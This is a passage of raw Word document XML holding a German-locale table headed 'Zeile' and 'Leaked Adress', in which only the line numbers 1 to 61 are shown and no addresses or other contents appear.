              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0346D6D2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4530"/>
        <w:gridCol w:w="4530"/>
      </w:tblGrid>
      <w:tr w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w14:paraId="70E863E9" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FABEFD5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Zeile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="121CAB68" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Leaked Adress</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w14:paraId="5CDFD645" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E4DC527" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2891250A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6346A920" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28D32F2E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48C5C988" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66D14DBB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="069FEB49" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4011F5A9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C0A1955" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A7A898C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49FBBE7D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59C79A59" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59793979" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A9EBB70" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5689816A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7436B584" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71DE8C60" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01BC2FCC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B824E65" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="410655C1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B14AE86" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53780340" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E218D69" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="283AC2D9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7151C02B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68461A72" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="647165BF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D594486" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14A6B75A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AD4B61C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D5B35C7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F2AD276" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48D8B110" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C0D957E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="702CE514" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="055D1619" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F256ADD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39817973" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="371D1076" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="710D56FB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27CECC67" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43845094" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46140A58" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09DD9DE0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15FE4DEE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="580055BD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FE608EE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56F1610F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05256B0C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="078862BC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="164082B1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43E28336" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63D09052" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="533D9498" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>54</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C7A8041" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>55</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0297332E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>56</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D931F09" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="101A8660" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>58</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64A1BCDB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>59</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BD70F4D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7472CC78" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>61</w:t>
            </w:r>
          </w:p>
